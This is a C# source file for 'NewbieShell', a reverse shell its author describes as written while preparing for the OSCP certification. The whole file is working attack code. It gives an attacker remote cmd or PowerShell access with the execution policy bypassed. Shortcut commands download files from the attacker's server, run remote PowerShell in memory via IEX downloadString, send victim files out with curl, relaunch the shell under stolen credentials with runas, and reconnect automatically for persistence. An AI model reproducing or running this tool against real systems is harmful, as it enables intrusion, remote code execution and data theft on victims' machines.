using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;

namespace NewbieShell
{
    /// <summary>
    /// A Reverse - Shell - Programm for Newbies.
    /// 
    /// When preparing for the OSCP certificate. 
    /// I have seen some reverse shell in action. The most annoying thing for me was that a very long text is needed when downloading and uploading. 
    /// Because I like to program in C#, I thought to myself. I simplify this a bit. 
    /// Through this idea, Newbie - Shell was born. With short keywords the attacker has the possibility to list downloads or uploads. This simplifies a lot.
    /// 
    /// Newbieshell.exe [ip] [port] [cmd.exe or powershell.exe]
    /// Example: NewbieShell.exe 192.168.0.1 80 cmd.exe
    /// </summary>

    public class Program
    {
        static StreamWriter sw;
        static string ip;
        static string path = @"C:\temp";
        static bool persistence = false;
        static int reconnecttimer = 0;

        public static void Main(string[] args)
        {

            /// if no args, then question
            if (args.Length > 0)
            {
                /// Powershell.exe
                if (args[2] == "powershell.exe")
                {
                    Console.WriteLine("Execute Powershell");
                    ip = args[0];
                    Connection(args[0], Convert.ToInt32(args[1]), "powershell.exe");
                }
                /// cmd.exe
                else
                {
                    Console.WriteLine("Execute cmd.exe");
                    Connection(args[0], Convert.ToInt32(args[1]), "cmd.exe");
                }
            }
            else
            {
                Console.Write("Attacker IP Address: ");

                ip = Console.ReadLine().ToString();
                int port = 0;

                if (ip == null || ip == "")
                {
                    Console.WriteLine("Error: No IP-Address");
                }
                else
                {
                    Console.Write("Attacker port: ");
                    port = Convert.ToInt32(Console.ReadLine());

                    if (port != 0)
                    {
                        Console.Write("Press 0 for 'cmd.exe' or 1 for 'powershell': ");
                        string shell = Console.ReadLine();
                        string command = string.Empty;

                        if (shell == "0")
                        {
                            command = "cmd.exe";
                        }
                        else if (shell == "1")
                        {
                            command = "powershell.exe";
                        }
                        else
                        {
                            command = "cmd.exe";
                        }

                        Console.WriteLine(string.Format("Start netcat with this command 'nc -vlnp {0}' on the attacker computer: ", port));
                        Console.Write("Press a button");
                        Console.ReadLine();

                        Connection(ip, port, command);
                    }
                    else
                    {
                        Console.WriteLine("Error: No port");
                    }
                }
            }
        }

        /// <summary>
        /// Connection
        /// </summary>
        /// <param name="ip">IP - Address</param>
        /// <param name="port">Port</param>
        /// <param name="command">Process - Command</param>
        private static void Connection(string ip, int port, string command)
        {
            try
            {
                // TCP - Connection
                using (TcpClient client = new TcpClient(ip, port))
                {
                    // Get the stream
                    using (var stream = client.GetStream())
                    {
                        // Streamreader
                        using (StreamReader rdr = new StreamReader(stream))
                        {

                            StringBuilder sb = new StringBuilder();

                            sw = new StreamWriter(stream);
                            sw.WriteLine("Welcome to Newbie - Shell");
                            sw.Flush();

                            Console.WriteLine("Connected");

                            Process pc = new Process();
                            pc.StartInfo.FileName = command;

                            // When the command is powershell.exe then write as argument "-ep bypass" to bypass the Powershell
                            // Execution Policy
                            if (command == "powershell.exe")
                            {
                                pc.StartInfo.Arguments = "-ep bypass";
                            }

                            pc.StartInfo.CreateNoWindow = true;
                            pc.StartInfo.UseShellExecute = false;
                            pc.StartInfo.RedirectStandardOutput = true;
                            pc.StartInfo.RedirectStandardInput = true;
                            pc.StartInfo.RedirectStandardError = true;
                            pc.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                            pc.ErrorDataReceived += new DataReceivedEventHandler(CmdErrorDataHandler);
                            try
                            {
                                pc.Start();
                                pc.BeginOutputReadLine();
                                pc.BeginErrorReadLine();
                               
                            }
                            catch (Exception ex)
                            {

                                Console.WriteLine(ex.Message);
                                pc.WaitForExit();
                                client.Close();
                                Environment.Exit(0);
                            }

                            System.Threading.Thread.Sleep(1000);

                            if (!System.IO.Directory.Exists(path))
                            {
                                pc.StandardInput.WriteLine("mkdir C:\\temp");
                                sw.WriteLine("Newbie - Shell create a folder with the name C:\\temp");
                                sw.Flush();
                            }

                            //If the attacker writes something into the terminal, then this command is executed at the victim.
                            while (true)
                            {
                                try
                                {
                                    //Read command from terminal.
                                    sb.Append(rdr.ReadLine());

                                    //The #D - command stands for "Download". The attacker can download from from the web server. 
                                    //For this purpose the system takes the IP - address from the reverse shell and the port 80. 
                                    if (sb.ToString().ToUpper() == "#D")
                                    {
                                        sw.WriteLine("Newbie-Shell start download - command");
                                        sw.WriteLine("Start the  with the command \"python3 - m http.server 80\" on the attacker machine");
                                        sw.Flush();

                                        sb.Remove(0, sb.Length);

                                        sw = new StreamWriter(stream);
                                        sw.Write("Name of the downloaded file: ");
                                        sw.Flush();

                                        sb.Append(rdr.ReadLine());
                                        WebClient myWebClient = new WebClient();
                                        string webresource = "http://" + ip + "/" + sb.ToString();

                                        try
                                        {
                                            myWebClient.DownloadFile(webresource, path + "\\" + sb.ToString());
                                            myWebClient.Dispose();

                                            sw.WriteLine(string.Format("{0} - file is downloaded on {1}", webresource, path));
                                            sw.Flush();
                                            sb.Remove(0, sb.Length);
                                        }
                                        catch (Exception ex)
                                        {
                                            sw.WriteLine(ex.Message);
                                            sw.Flush();
                                            sb.Remove(0, sb.Length);
                                        }

                                    }
                                    //Invoke-Expression
                                    else if (sb.ToString().ToUpper() == "#IEX")
                                    {
                                        sw.WriteLine("Newbie-Shell start IEX - Command");
                                        sw.WriteLine("Start the  with the command \"python3 - m http.server 80\" on the attacker machine");
                                        sw.Flush();

                                        sb.Remove(0, sb.Length);

                                        sw = new StreamWriter(stream);
                                        sw.Write("Downloaded file from memory: ");
                                        sw.Flush();

                                        string filename = rdr.ReadLine();
                                        string cmd = string.Format("powershell \"IEX(New-Object Net.WebClient).downloadString('http://{0}/{1}')", ip, filename);

                                        try
                                        {
                                            pc.StandardInput.WriteLine(cmd);
                                            sw.WriteLine(string.Format("OK"));
                                            sw.Flush();
                                        }
                                        catch (Exception ex)
                                        {
                                            sw.WriteLine(ex.Message);
                                            sw.Flush();
                                            Console.WriteLine(ex.Message);
                                        }

                                    }
                                    // Upload file to the attacker with CURL. The attacker can upload the file from the victim to a webserver.
                                    // For this purpose the system takes the IP - address from the reverse shell and the port 80.
                                    // Install the uploadserver "pip3 install uploadserver" and start it with the command "python3 -m uploadserver 80" on the attacker machine.
                                    // Works only with cmd.exe not with powershell.exe
                                    else if (sb.ToString().ToUpper() == "#U")
                                    {
                                        //To save the actual path
                                        //process.StandardInput.WriteLine("dir");

                                        string cmd = string.Empty;
                                        string filename = string.Empty;
                                        string websource = string.Empty;

                                        sb.Remove(0, sb.Length);
                                        sw = new StreamWriter(stream);
                                        sw.WriteLine("Newbie-Shell start upload - command");
                                        sw.WriteLine("Install the uploadserver \"pip3 install uploadserver\" on the attacker machine");
                                        sw.WriteLine("Start the the uploadserver with this command \"python3 - m uploadserver 80\" on the Attacker Machine");
                                        sw.Write("Full path of the uploaded file: ");
                                        sw.Flush();

                                        //Upload with powershell.exe
                                        if (command == "powershell.exe")
                                        { 
                                            filename = rdr.ReadLine();
                                            websource = "http://" + ip + "/upload";
                                            string curlcommand = "curl -F files=@" + filename + " " + websource;
                                            cmd = "cmd /c " + curlcommand;

                                        }
                                        //Upload with cmd.exe
                                        else
                                        {
                                            filename = rdr.ReadLine();
                                            websource = "http://" + ip + "/upload";
                                            cmd = "curl -F files=@" + filename + " " + websource;
                                        }

                                        try
                                        {
                                            pc.StandardInput.WriteLine(cmd);
                                            sw.WriteLine(string.Format("{0} - File is uploaded on {1}", filename, websource));
                                            sw.Flush();
                                        }
                                        catch (Exception ex)
                                        {
                                            sw.WriteLine(ex.Message);
                                            sw.Flush();
                                            Console.WriteLine(ex.Message);
                                        }
                                    }
                                    // Help - File
                                    else if (sb.ToString().ToUpper() == "#H")
                                    {
                                        sw.WriteLine("#D ------> Download file from Attacker! Start python3 -m http.server 80 on the attacker machine");
                                        sw.WriteLine("#U ------> Upload file to the Attacker! Install the uploadserver \"pip3 install uploadserver\" and start it with the command \"python3 -m uploadserver 80\")");
                                        sw.WriteLine("#IEX ------> Invoke-Expression! Start python3 -m http.server 80 on the attacker machine");
                                        sw.WriteLine("#I --------> Impersonat with new Credentials");
                                        sw.WriteLine("#H ------> Help");
                                        sw.Flush();
                                        sb.Remove(0, sb.Length);
                                    }
                                    // Impersonat and make a new connection with Newbie-Shell with new Credentials
                                    else if (sb.ToString().ToUpper() == "#I")
                                    {
                                        sb.Remove(0, sb.Length);

                                        sw.WriteLine("Newbie-Shell start Runas / Impersonate");
                                        sw.WriteLine("Start nc -vlnp " + port + " on the attacker machine");
                                        sw.Write("Username: ");
                                        sw.Flush();

                                        string username = rdr.ReadLine();

                                        sw.Write("Password: ");
                                        sw.Flush();
                                        string password = rdr.ReadLine();

                                        sw.WriteLine("When no domain then let the field empty");
                                        sw.Write("Domain: ");
                                        sw.Flush();
                                        string domain = rdr.ReadLine();

                                        string exepath = System.Reflection.Assembly.GetCallingAssembly().Location;
                                        string impersonatecmd = exepath + " " + ip + " " + port + " " + command;
                                        string cmd = string.Empty;

                                        if (domain == "")
                                        {
                                            string HostName = Dns.GetHostName();

                                            cmd = string.Format("runas /netonly /user:{0}\\{1} \"{2}\"", HostName, username, impersonatecmd);
                                        }
                                        else
                                        {
                                            cmd = string.Format("runas /netonly /user:{0}\\{1} \"{2}\"", domain, username, impersonatecmd);
                                        }

                                        try
                                        {
                                            pc.StandardInput.WriteLine(cmd);
                                            System.Threading.Thread.Sleep(1000);
                                            pc.StandardInput.WriteLine(password);
                                            sw.WriteLine(string.Format("OK"));
                                            sw.Flush();
                                        }
                                        catch (Exception ex)
                                        {
                                            sw.WriteLine(ex.Message);
                                            sw.Flush();
                                            Console.WriteLine(ex.Message);
                                        }
                                    }
                                    // If persistence is true, the system will try to reconnect to the attacker after few minutes.
                                    else if (sb.ToString().ToUpper() == "#P")
                                    {
                                        sb.Remove(0, sb.Length);

                                        sw.Write("Do you want to reconnect in case of a connection failure. Y or N: ");
                                        sw.Flush();
                                        string answer = rdr.ReadLine();

                                        if (answer.ToUpper() == "Y")
                                        {
                                            persistence = true;

                                            sw.Write("After how many minutes should the connection be established?: ");
                                            sw.Flush();
                                            answer = rdr.ReadLine();
                                            int number = 0;

                                            bool isparsable = Int32.TryParse(answer, out number);

                                            if (number != 0 && isparsable)
                                            {
                                                reconnecttimer = number;
                                            }
                                            else
                                            {
                                                reconnecttimer = 5;
                                            }

                                            sw.WriteLine("Persistence activated!");
                                            sw.Flush();

                                        }
                                        else
                                        {
                                            persistence = false;
                                        }

                                    }
                                    // Standard command
                                    else
                                    {
                                        try
                                        {
                                            pc.StandardInput.WriteLine(sb);
                                            sb.Remove(0, sb.Length);
                                        }
                                        catch (Exception ex)
                                        {
                                            Console.WriteLine(ex.Message);
                                            client.Close();
                                            Environment.Exit(0);
                                        }
                                    }

                                }
                                // Exception error
                                catch (Exception ex)
                                {
                                    Console.WriteLine(ex.Message);

                                    if (persistence)
                                    {
                                        Console.WriteLine("Reconnection started in " + reconnecttimer + " minutes");
                                        ReConnection(ip, port, command, reconnecttimer);
                                    }
                                    else
                                    {
                                        client.Close();
                                        Environment.Exit(0);
                                    }
                                }
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                Environment.Exit(0);
            }
        }

        /// <summary>
        /// Print data when error.
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="outLine"></param>
        private static void CmdErrorDataHandler(object sender, DataReceivedEventArgs outLine)
        {
            StringBuilder sb = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    sb.Append(outLine.Data);
                    sw.WriteLine(sb);
                    sw.Flush();
                }
                catch (Exception err)
                {
                    Console.WriteLine(err);
                }
            }
        }

        /// <summary>
        /// Print data on the attacker screen.
        /// </summary>
        /// <param name="sendingProcess"></param>
        /// <param name="outLine"></param>
        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder sb = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    sb.Append(outLine.Data);
                    sw.WriteLine(sb);
                    sw.Flush();
                }
                catch (Exception err)
                {
                    Console.WriteLine(err);
                }
            }
        }
        /// <summary>
        /// Reconnection after connection break up
        /// </summary>
        /// <param name="ip"></param>
        /// <param name="port"></param>
        /// <param name="command"></param>
        /// <param name="timer"></param>
        private static void ReConnection(string ip, int port, string command, int timer)
        {
            System.Threading.Thread.Sleep(timer * 60000);
            Connection(ip, port, command);
        }
    }
}
